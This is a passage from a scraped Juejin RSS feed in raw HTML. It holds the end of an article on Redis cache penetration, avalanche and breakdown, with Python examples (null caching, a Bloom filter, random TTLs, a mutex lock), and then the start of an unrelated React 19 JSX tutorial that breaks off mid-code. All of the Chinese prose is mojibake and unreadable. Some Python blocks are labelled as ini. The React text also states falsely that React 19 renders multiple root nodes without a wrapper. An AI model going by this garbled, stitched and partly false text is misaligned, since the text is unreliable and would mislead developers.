<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_user</span>(<span class="hljs-params">user_id</span>):
    key = <span class="hljs-string">f"user:<span class="hljs-subst">{user_id}</span>"</span>
    cached = redis.get(key)
    <span class="hljs-keyword">if</span> cached <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">if</span> cached == <span class="hljs-string">""</span> <span class="hljs-keyword">else</span> json.loads(cached)
    
    <span class="hljs-comment"># æŸ¥è¯¢ DB</span>
    user = db.query(<span class="hljs-string">"SELECT ... WHERE id=%s"</span>, user_id)
    <span class="hljs-keyword">if</span> user:
        redis.setex(key, <span class="hljs-number">300</span>, json.dumps(user))
    <span class="hljs-keyword">else</span>:
        <span class="hljs-comment"># âœ… å…³é”®ï¼šç¼“å­˜ç©ºç»“æœï¼ˆçŸ­ TTLï¼‰</span>
        redis.setex(key, <span class="hljs-number">60</span>, <span class="hljs-string">""</span>)  <span class="hljs-comment"># åªç¼“å­˜ 60 ç§’</span>
    <span class="hljs-keyword">return</span> user
</code></pre>
<h4 data-id="heading-14">æ–¹æ¡ˆ 2ï¼š<strong>å¸ƒéš†è¿‡æ»¤å™¨ï¼ˆBloom Filterï¼‰</strong></h4>
<ul>
<li>åœ¨ç¼“å­˜å‰åŠ ä¸€å±‚ <strong>å¸ƒéš†è¿‡æ»¤å™¨</strong></li>
<li>å¿«é€Ÿåˆ¤æ–­ key æ˜¯å¦â€œå¯èƒ½å­˜åœ¨â€</li>
<li>è‹¥å¸ƒéš†è¿‡æ»¤å™¨è¿”å›â€œä¸å­˜åœ¨â€ï¼Œç›´æ¥æ‹’ç»è¯·æ±‚</li>
</ul>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> pybloom_live <span class="hljs-keyword">import</span> BloomFilter

<span class="hljs-comment"># åˆå§‹åŒ–å¸ƒéš†è¿‡æ»¤å™¨ï¼ˆé¢„è®¡ 100 ä¸‡ç”¨æˆ·ï¼‰</span>
bf = BloomFilter(capacity=<span class="hljs-number">1000000</span>, error_rate=<span class="hljs-number">0.001</span>)

<span class="hljs-comment"># é¢„åŠ è½½æ‰€æœ‰åˆæ³• user_id</span>
<span class="hljs-keyword">for</span> uid <span class="hljs-keyword">in</span> all_valid_user_ids:
    bf.add(uid)

<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_user_safe</span>(<span class="hljs-params">user_id</span>):
    <span class="hljs-keyword">if</span> user_id <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> bf:
        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">"Invalid user ID"</span>)  <span class="hljs-comment"># ç›´æ¥æ‹¦æˆª</span>
    <span class="hljs-keyword">return</span> get_user(user_id)
</code></pre>
<blockquote>
<p>ğŸ“Œ <strong>é€‚ç”¨åœºæ™¯</strong>ï¼š</p>
<ul>
<li>ç©ºå€¼ç¼“å­˜ï¼šé€‚ç”¨äºå°‘é‡æ— æ•ˆè¯·æ±‚</li>
<li>å¸ƒéš†è¿‡æ»¤å™¨ï¼šé€‚ç”¨äºæµ·é‡æ— æ•ˆè¯·æ±‚ï¼ˆå¦‚çˆ¬è™«æ”»å‡»ï¼‰</li>
</ul>
</blockquote>
<hr/>
<h2 data-id="heading-15">ä¸‰ã€ç¼“å­˜é›ªå´©ï¼ˆCache Avalancheï¼‰</h2>
<h3 data-id="heading-16">ğŸ” é—®é¢˜æè¿°</h3>
<p><strong>å¤§é‡ç¼“å­˜ key åœ¨åŒä¸€æ—¶åˆ»å¤±æ•ˆ</strong>ï¼Œå¯¼è‡´ï¼š</p>
<ul>
<li>æ‰€æœ‰è¯·æ±‚åŒæ—¶æ‰“åˆ°æ•°æ®åº“</li>
<li>DB ç¬é—´å‹åŠ›è¿‡å¤§ï¼Œå¯èƒ½å´©æºƒ</li>
</ul>
<h3 data-id="heading-17">ğŸ§© å…¸å‹åŸå› </h3>
<ul>
<li>ç¼“å­˜æœåŠ¡å™¨å®•æœºï¼ˆå…¨éƒ¨å¤±æ•ˆï¼‰</li>
<li>æ‰€æœ‰ key è®¾ç½®äº†ç›¸åŒçš„è¿‡æœŸæ—¶é—´ï¼ˆå¦‚ç»Ÿä¸€ 2 å°æ—¶ï¼‰</li>
</ul>
<h3 data-id="heading-18">âš ï¸ å±å®³</h3>
<ul>
<li>æ•°æ®åº“è¿æ¥æ± è€—å°½</li>
<li>æœåŠ¡å¤§é¢ç§¯ä¸å¯ç”¨</li>
</ul>
<h3 data-id="heading-19">âœ… è§£å†³æ–¹æ¡ˆ</h3>
<h4 data-id="heading-20">æ–¹æ¡ˆ 1ï¼š<strong>è®¾ç½®éšæœºè¿‡æœŸæ—¶é—´</strong></h4>
<pre><code class="hljs language-ini" lang="ini">import random

def set_cache_with_random_ttl(key, value, <span class="hljs-attr">base_ttl</span>=<span class="hljs-number">3600</span>):
    <span class="hljs-comment"># åœ¨åŸºç¡€ TTL ä¸Šå¢åŠ éšæœºå€¼ï¼ˆå¦‚ Â±5 åˆ†é’Ÿï¼‰</span>
    <span class="hljs-attr">ttl</span> = base_ttl + random.randint(-<span class="hljs-number">300</span>, <span class="hljs-number">300</span>)
    redis.setex(key, max(ttl, 60), value)  <span class="hljs-comment"># ç¡®ä¿è‡³å°‘ 60 ç§’</span>
</code></pre>
<h4 data-id="heading-21">æ–¹æ¡ˆ 2ï¼š<strong>æ°¸ä¸è¿‡æœŸ + åå°å¼‚æ­¥æ›´æ–°</strong></h4>
<ul>
<li>ç¼“å­˜ä¸è®¾ TTL</li>
<li>å¯åŠ¨åå°çº¿ç¨‹å®šæœŸæ›´æ–°çƒ­ç‚¹æ•°æ®</li>
<li>è¯·æ±‚æ—¶è‹¥å‘ç°æ•°æ®â€œå¤ªæ—§â€ï¼Œè§¦å‘å¼‚æ­¥åˆ·æ–°ï¼ˆ<strong>Refresh-Ahead</strong>ï¼‰</li>
</ul>
<h4 data-id="heading-22">æ–¹æ¡ˆ 3ï¼š<strong>é«˜å¯ç”¨æ¶æ„</strong></h4>
<ul>
<li>Redis é›†ç¾¤ï¼ˆClusterï¼‰é¿å…å•ç‚¹æ•…éšœ</li>
<li>å¤šçº§ç¼“å­˜ï¼ˆæœ¬åœ°ç¼“å­˜ + Redisï¼‰</li>
</ul>
<blockquote>
<p>ğŸ“Œ <strong>å…³é”®</strong>ï¼š<strong>é¿å…æ‰€æœ‰ key åŒæ—¶å¤±æ•ˆï¼</strong></p>
</blockquote>
<hr/>
<h2 data-id="heading-23">å››ã€ç¼“å­˜å‡»ç©¿ï¼ˆCache Breakdownï¼‰</h2>
<h3 data-id="heading-24">ğŸ” é—®é¢˜æè¿°</h3>
<p><strong>æŸä¸ªçƒ­ç‚¹ key è¿‡æœŸç¬é—´</strong>ï¼Œå¤§é‡å¹¶å‘è¯·æ±‚åŒæ—¶å‘ç°ç¼“å­˜å¤±æ•ˆï¼Œå…¨éƒ¨æ‰“åˆ°æ•°æ®åº“ã€‚</p>
<h3 data-id="heading-25">ğŸ§© ä¸é›ªå´©çš„åŒºåˆ«</h3>

























<table><thead><tr><th/><th>ç¼“å­˜å‡»ç©¿</th><th>ç¼“å­˜é›ªå´©</th></tr></thead><tbody><tr><td>èŒƒå›´</td><td>å•ä¸ªçƒ­ç‚¹ key</td><td>å¤§é‡ key åŒæ—¶å¤±æ•ˆ</td></tr><tr><td>åŸå› </td><td>çƒ­ç‚¹æ•°æ®è¿‡æœŸ</td><td>ç»Ÿä¸€è¿‡æœŸ or æœåŠ¡å®•æœº</td></tr><tr><td>å½±å“</td><td>å•ä¸ªæ¥å£å‹å® DB</td><td>æ•´ä¸ªç³»ç»Ÿç˜«ç—ª</td></tr></tbody></table>
<h3 data-id="heading-26">âš ï¸ å±å®³</h3>
<ul>
<li>å•ä¸ªçƒ­é—¨å•†å“è¯¦æƒ…é¡µæŸ¥è¯¢æ‰“å® DB</li>
<li>ç§’æ€æ´»åŠ¨åº“å­˜æŸ¥è¯¢è¶…è½½</li>
</ul>
<h3 data-id="heading-27">âœ… è§£å†³æ–¹æ¡ˆ</h3>
<h4 data-id="heading-28">æ–¹æ¡ˆ 1ï¼š<strong>çƒ­ç‚¹ key æ°¸ä¸è¿‡æœŸ</strong></h4>
<ul>
<li>å¯¹å·²çŸ¥çƒ­ç‚¹æ•°æ®ï¼ˆå¦‚é¦–é¡µ bannerï¼‰ä¸è®¾ TTL</li>
<li>é€šè¿‡åå°ä»»åŠ¡å®šæœŸæ›´æ–°</li>
</ul>
<h4 data-id="heading-29">æ–¹æ¡ˆ 2ï¼š<strong>äº’æ–¥é”ï¼ˆMutex Lockï¼‰</strong></h4>
<ul>
<li>åªå…è®¸ä¸€ä¸ªçº¿ç¨‹é‡å»ºç¼“å­˜ï¼Œå…¶ä»–çº¿ç¨‹ç­‰å¾…</li>
<li>ä½¿ç”¨ Redis åˆ†å¸ƒå¼é”å®ç°</li>
</ul>
<pre><code class="hljs language-ini" lang="ini">def get_hot_product(product_id):
    <span class="hljs-attr">key</span> = f<span class="hljs-string">"product:{product_id}"</span>
    <span class="hljs-attr">product</span> = redis.get(key)
    if product:
        return json.loads(product)
    
    <span class="hljs-comment"># å°è¯•è·å–åˆ†å¸ƒå¼é”</span>
    <span class="hljs-attr">lock_key</span> = f<span class="hljs-string">"{key}:lock"</span>
    if acquire_lock(lock_key, <span class="hljs-attr">timeout</span>=<span class="hljs-number">2</span>):  <span class="hljs-comment"># è·å–é”ï¼ˆè§å‰æ–‡ Lua è„šæœ¬ï¼‰</span>
        try:
            <span class="hljs-comment"># åŒé‡æ£€æŸ¥ï¼ˆé˜²æ­¢å…¶ä»–çº¿ç¨‹å·²åŠ è½½ï¼‰</span>
            <span class="hljs-attr">product</span> = redis.get(key)
            if not product:
                <span class="hljs-attr">product</span> = db.query(<span class="hljs-string">"SELECT ..."</span>)
                redis.setex(key, 300, json.dumps(product))
        finally:
            release_lock(lock_key)
    else:
        <span class="hljs-comment"># æœªè·å¾—é”ï¼ŒçŸ­æš‚ç­‰å¾…åé‡è¯•ï¼ˆæˆ–è¿”å›æ—§æ•°æ®ï¼‰</span>
        time.sleep(0.01)
        return get_hot_product(product_id)
    
    return product
</code></pre>
<h4 data-id="heading-30">æ–¹æ¡ˆ 3ï¼š<strong>é€»è¾‘è¿‡æœŸï¼ˆLogical Expirationï¼‰</strong></h4>
<ul>
<li>ç¼“å­˜ä¸­å­˜å‚¨ <strong>æ•°æ® + é€»è¾‘è¿‡æœŸæ—¶é—´</strong></li>
<li>è¯·æ±‚æ—¶è‹¥é€»è¾‘è¿‡æœŸï¼Œåˆ™å¼‚æ­¥æ›´æ–°ï¼Œä½†<strong>ä»è¿”å›æ—§æ•°æ®</strong></li>
</ul>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"data"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> ... <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"expire_time"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1717020000</span>  <span class="hljs-comment">// é€»è¾‘è¿‡æœŸæ—¶é—´æˆ³</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<blockquote>
<p>ğŸ“Œ <strong>é€‚ç”¨åœºæ™¯</strong>ï¼š</p>
<ul>
<li>å…è®¸çŸ­æš‚è¿”å›æ—§æ•°æ®ï¼ˆå¦‚å•†å“ä»·æ ¼ã€æ–‡ç« å†…å®¹ï¼‰</li>
<li>ä¸å…è®¸åœé¡¿ï¼ˆå¦‚é«˜å¹¶å‘ APIï¼‰</li>
</ul>
</blockquote>
<hr/>
<h2 data-id="heading-31">âœ… æ€»ç»“å¯¹æ¯”è¡¨</h2>



































<table><thead><tr><th>é—®é¢˜</th><th>åŸå› </th><th>å½±å“èŒƒå›´</th><th>æ ¸å¿ƒè§£å†³æ–¹æ¡ˆ</th></tr></thead><tbody><tr><td><strong>åŒå†™ä¸ä¸€è‡´</strong></td><td>æ›´æ–°æ—¶åºé—®é¢˜</td><td>å•æ¡æ•°æ®ä¸ä¸€è‡´</td><td>å»¶è¿ŸåŒåˆ  / Binlog è®¢é˜…</td></tr><tr><td><strong>ç¼“å­˜ç©¿é€</strong></td><td>æŸ¥è¯¢ä¸å­˜åœ¨çš„æ•°æ®</td><td>DB è¢«æ— æ•ˆè¯·æ±‚æ‰“å®</td><td>ç©ºå€¼ç¼“å­˜ / å¸ƒéš†è¿‡æ»¤å™¨</td></tr><tr><td><strong>ç¼“å­˜é›ªå´©</strong></td><td>å¤§é‡ key åŒæ—¶å¤±æ•ˆ</td><td>æ•´ä¸ªç³»ç»Ÿç˜«ç—ª</td><td>éšæœº TTL / é«˜å¯ç”¨æ¶æ„</td></tr><tr><td><strong>ç¼“å­˜å‡»ç©¿</strong></td><td>çƒ­ç‚¹ key è¿‡æœŸ</td><td>å•ä¸ªæ¥å£å‹å® DB</td><td>äº’æ–¥é” / æ°¸ä¸è¿‡æœŸ</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-32">ğŸ›¡ï¸ ç»¼åˆé˜²å¾¡ç­–ç•¥ï¼ˆç”Ÿäº§ç¯å¢ƒæ¨èï¼‰</h2>
<ol>
<li>
<p><strong>å®‰å…¨å±‚</strong>ï¼šAPI ç½‘å…³æ ¡éªŒå‚æ•°åˆæ³•æ€§ï¼ˆé˜²ç©¿é€ï¼‰</p>
</li>
<li>
<p><strong>ç¼“å­˜å±‚</strong>ï¼š</p>
<ul>
<li>æ‰€æœ‰ key è®¾ç½® <strong>éšæœº TTL</strong></li>
<li>çƒ­ç‚¹ key <strong>æ°¸ä¸è¿‡æœŸ + åå°åˆ·æ–°</strong></li>
<li>ä¸å­˜åœ¨çš„æ•°æ® <strong>ç¼“å­˜ç©ºå€¼ï¼ˆ60ç§’ï¼‰</strong></li>
</ul>
</li>
<li>
<p><strong>æ›´æ–°å±‚</strong>ï¼š</p>
<ul>
<li>å†™æ“ä½œé‡‡ç”¨ <strong>â€œå…ˆåˆ ç¼“å­˜ â†’ æ›´æ–° DB â†’ å»¶è¿Ÿå†åˆ â€</strong></li>
<li>å…³é”®æ•°æ®ä½¿ç”¨ <strong>Binlog å¼‚æ­¥ä¿®æ­£</strong></li>
</ul>
</li>
<li>
<p><strong>å®¹ç¾å±‚</strong>ï¼š</p>
<ul>
<li>Redis é›†ç¾¤ + å“¨å…µ</li>
<li>æœ¬åœ°ç¼“å­˜ï¼ˆCaffeineï¼‰å…œåº•</li>
<li>ç†”æ–­é™çº§ï¼ˆHystrix/Sentinelï¼‰</li>
</ul>
</li>
</ol>
<blockquote>
<p>ğŸ’¡ <strong>è®°ä½</strong>ï¼š<br/>
<strong>æ²¡æœ‰é“¶å¼¹ï¼Œåªæœ‰ç»„åˆæ‹³ã€‚</strong><br/>
æ ¹æ®ä¸šåŠ¡åœºæ™¯é€‰æ‹©åˆé€‚ç­–ç•¥ï¼Œæ‰èƒ½æ„å»ºé«˜å¯ç”¨ç¼“å­˜ä½“ç³»ã€‚</p>
</blockquote>
<p>å¦‚æœéœ€è¦ <strong>å…·ä½“ä»£ç å®ç°ï¼ˆGo/Java/Node.jsï¼‰</strong> æˆ– <strong>Redis é…ç½®æ¨¡æ¿</strong>ï¼Œæ¬¢è¿ç»§ç»­æé—®ï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[React ä»å…¥é—¨åˆ°å‡ºé—¨ç¬¬ä¸€ç«  JSX å¢å¼ºç‰¹æ€§ä¸å‡½æ•°ç»„ä»¶å…¥é—¨]]></title>    <link>https://juejin.cn/post/7589893746080956457</link>    <guid>https://juejin.cn/post/7589893746080956457</guid>    <pubDate>2026-01-01T15:42:32.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589893746080956457" data-draft-id="7589893746080940073" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="React ä»å…¥é—¨åˆ°å‡ºé—¨ç¬¬ä¸€ç«   JSX å¢å¼ºç‰¹æ€§ä¸å‡½æ•°ç»„ä»¶å…¥é—¨"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript,React.js"/> <meta itemprop="datePublished" content="2026-01-01T15:42:32.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ€•æµªçŒ«"/> <meta itemprop="url" content="https://juejin.cn/user/2832784963939438"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            React ä»å…¥é—¨åˆ°å‡ºé—¨ç¬¬ä¸€ç«   JSX å¢å¼ºç‰¹æ€§ä¸å‡½æ•°ç»„ä»¶å…¥é—¨
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2832784963939438/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ€•æµªçŒ«
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-01T15:42:32.000Z" title="Thu Jan 01 2026 15:42:32 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-01
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    9
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8153fb22078e442ea92c7811626cddd4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oCV5rWq54yr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767888151&amp;x-signature=3yR4tCKDrSQApD8BQTO6n6t4W48%3D" alt="G9Sht3iaIAA1MIG.jpeg" loading="lazy"/></p>
<p>ä»Šå¤©å’±ä»¬ä» React 19 çš„åŸºç¡€è¯­æ³•å…¥æ‰‹ï¼ŒèŠèŠ JSX å¢å¼ºç‰¹æ€§å’Œå‡½æ•°ç»„ä»¶çš„æ ¸å¿ƒç”¨æ³•ã€‚å¯¹äºåˆšæ¥è§¦ React 19 çš„åŒå­¦æ¥è¯´ï¼Œè¿™ä¸¤å—æ˜¯æ­å»ºåº”ç”¨çš„åŸºçŸ³â€”â€”å‡½æ•°ç»„ä»¶æ˜¯ React 19 çš„æ ¸å¿ƒè½½ä½“ï¼Œè€Œ JSX åˆ™è®©æˆ‘ä»¬èƒ½ä»¥æ›´ç›´è§‚çš„æ–¹å¼æè¿° UI ç»“æ„ã€‚</p>
<p>æ›´é‡è¦çš„æ˜¯ï¼ŒReact 19 å¯¹ JSX åšäº†ä¸å°‘å®ç”¨å¢å¼ºï¼Œæ¯”å¦‚æ”¯æŒå¤šæ ¹èŠ‚ç‚¹é»˜è®¤ä¸åŒ…è£¹ã€æ”¹è¿›ç¢ç‰‡è¯­æ³•ç­‰ï¼Œè¿™äº›ç‰¹æ€§èƒ½ç›´æ¥æå‡æˆ‘ä»¬çš„å¼€å‘æ•ˆç‡ã€‚ä¸‹é¢å’±ä»¬ç»“åˆå…·ä½“æ¡ˆä¾‹ï¼Œä»â€œæ˜¯ä»€ä¹ˆâ†’æ€ä¹ˆç”¨â†’ä¸ºä»€ä¹ˆâ€ä¸‰ä¸ªç»´åº¦ï¼ŒæŠŠè¿™äº›çŸ¥è¯†ç‚¹è®²é€ï½</p>
<h2 data-id="heading-0">ä¸€ã€å…ˆææ‡‚æ ¸å¿ƒæ¦‚å¿µï¼šå‡½æ•°ç»„ä»¶ä¸ JSX æ˜¯ä»€ä¹ˆï¼Ÿ</h2>
<h3 data-id="heading-1">1. å‡½æ•°ç»„ä»¶ï¼šReact 19 çš„â€œUI æ„å»ºå•å…ƒâ€</h3>
<p>å‡½æ•°ç»„ä»¶ï¼Œé¡¾åæ€ä¹‰å°±æ˜¯ç”¨<code>JavaScript å‡½æ•°</code> å®šä¹‰çš„ React ç»„ä»¶ã€‚å®ƒçš„æ ¸å¿ƒä½œç”¨æ˜¯ï¼šæ¥æ”¶ <code>props</code> æ•°æ®ï¼Œè¿”å›ä¸€æ®µæè¿° UI ç»“æ„çš„ JSX ä»£ç ï¼Œæœ€ç»ˆè¢« React æ¸²æŸ“åˆ°é¡µé¢ä¸Šã€‚</p>
<p>åœ¨ React 19 ä¸­ï¼Œå‡½æ•°ç»„ä»¶æ˜¯ç»å¯¹çš„ä¸»æµâ€”â€”ç›¸æ¯”æ—§ç‰ˆæœ¬çš„ class ç»„ä»¶ï¼Œå®ƒæ›´ç®€æ´ã€æ›´æ˜“ç»´æŠ¤ï¼Œè€Œä¸”æ‰€æœ‰æ–°ç‰¹æ€§ï¼ˆæ¯”å¦‚æ–° Hooksã€Actions API ç­‰ï¼‰éƒ½ä¼˜å…ˆé€‚é…å‡½æ•°ç»„ä»¶ã€‚</p>
<h3 data-id="heading-2">2. JSXï¼šJavaScript ä¸ UI çš„â€œæ¡¥æ¢â€</h3>
<p>JSX å…¨ç§°æ˜¯ <code>JavaScript XML</code>ï¼Œæ˜¯ React æ¨å‡ºçš„ä¸€ç§è¯­æ³•æ‰©å±•ã€‚å®ƒå…è®¸æˆ‘ä»¬åœ¨ JavaScript ä»£ç ä¸­ç›´æ¥å†™ HTML é£æ ¼çš„æ ‡ç­¾ï¼Œæ—¢ä¿ç•™äº† JavaScript çš„é€»è¾‘è¡¨è¾¾èƒ½åŠ›ï¼Œåˆå…·å¤‡ HTML çš„ç›´è§‚æ€§ã€‚</p>
<p>æ³¨æ„ï¼šJSX å¹¶ä¸æ˜¯åŸç”Ÿ JavaScript è¯­æ³•ï¼Œæµè§ˆå™¨æ— æ³•ç›´æ¥è¯†åˆ«ï¼Œéœ€è¦é€šè¿‡ Babel ç­‰å·¥å…·è½¬è¯‘ä¸ºæ™®é€š JavaScript ä»£ç åæ‰èƒ½è¿è¡Œã€‚ä¸è¿‡åœ¨ React 19 é¡¹ç›®ä¸­ï¼ˆæ¯”å¦‚ç”¨ Vite æˆ– Create React App åˆå§‹åŒ–çš„é¡¹ç›®ï¼‰ï¼Œè¿™äº›è½¬è¯‘å·¥ä½œä¼šè¢«å·¥å…·é“¾è‡ªåŠ¨å¤„ç†ï¼Œæˆ‘ä»¬ç›´æ¥å†™ JSX å³å¯ã€‚</p>
<h2 data-id="heading-3">äºŒã€å‡½æ•°ç»„ä»¶å…¥é—¨ï¼šä»â€œæœ€ç®€å•çš„ç»„ä»¶â€å¼€å§‹å†™</h2>
<p>å’±ä»¬å…ˆä»æœ€åŸºç¡€çš„å‡½æ•°ç»„ä»¶å†™èµ·ï¼ŒæŒæ¡â€œå®šä¹‰â†’ä½¿ç”¨â†’ä¼ å‚â€çš„å®Œæ•´æµç¨‹ã€‚</p>
<h3 data-id="heading-4">1. å®šä¹‰ä¸€ä¸ªæœ€ç®€å•çš„å‡½æ•°ç»„ä»¶</h3>
<p>ä¸€ä¸ªå‡½æ•°ç»„ä»¶çš„æ ¸å¿ƒç»“æ„éå¸¸ç®€å•ï¼šå°±æ˜¯ä¸€ä¸ªè¿”å› JSX çš„å‡½æ•°ã€‚æ¯”å¦‚ä¸‹é¢è¿™ä¸ªâ€œHello React 19â€ç»„ä»¶ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// å®šä¹‰å‡½æ•°ç»„ä»¶ï¼šæ¥æ”¶ props å‚æ•°ï¼ˆå¯é€‰ï¼‰ï¼Œè¿”å› JSX</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">HelloReact19</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// ç»„ä»¶å†…éƒ¨å¯ä»¥å†™ JavaScript é€»è¾‘</span>
